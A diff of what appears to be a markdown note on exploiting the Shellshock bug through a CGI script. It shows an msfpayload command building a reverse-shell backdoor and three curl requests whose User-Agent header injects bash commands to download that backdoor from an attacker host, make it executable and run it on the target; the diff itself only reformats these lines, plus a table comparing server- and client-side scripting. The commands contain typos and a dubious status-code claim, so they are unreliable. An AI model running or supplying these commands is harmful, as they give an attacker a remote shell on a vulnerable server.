@@ -17,9 +17,10 @@ Attacks vector:
 We need to create our payload:
 Msfpayload linux/x64/shell/reverse_tcp LHOST=192.168.0.2 LPORT=4444 X ? /tmp/backdoor
 
-Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “wget http://192.168.0.2/backdoor -O /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
-Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “chmod +x /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
-Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “exec /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
+- Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “wget http://192.168.0.2/backdoor -O /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
+- Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “chmod +x /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
+- Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “exec /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
+
 Error code 200 – indicates that server is not vulnerable,
 Error code 500– indicates that server is vulnerable.
 
@@ -30,7 +31,7 @@ CGI-BIN it is directory where we can store end execute scirpts .cgi, usual wrote
 
 Method	                |	Where is the script code located ?	|	Where is the script code executed ? 
 CGI	                    |	In files in the CGI-BIN directory on the server.	|	On the server. 
-PHP, ColdFusion, ASP	|	Embedded in the HTML document.	    |	On the server. 
+PHP, ColdFusion, ASP	  |	Embedded in the HTML document.	    |	On the server. 
 Javascript	            |	Embedded in the HTML document.	    |	On the user's PC by their browser. 
-Java	                |	In files on the server.         	|	On the user's PC by their browser. 
+Java	                  |	In files on the server.           	|	On the user's PC by their browser. 
 
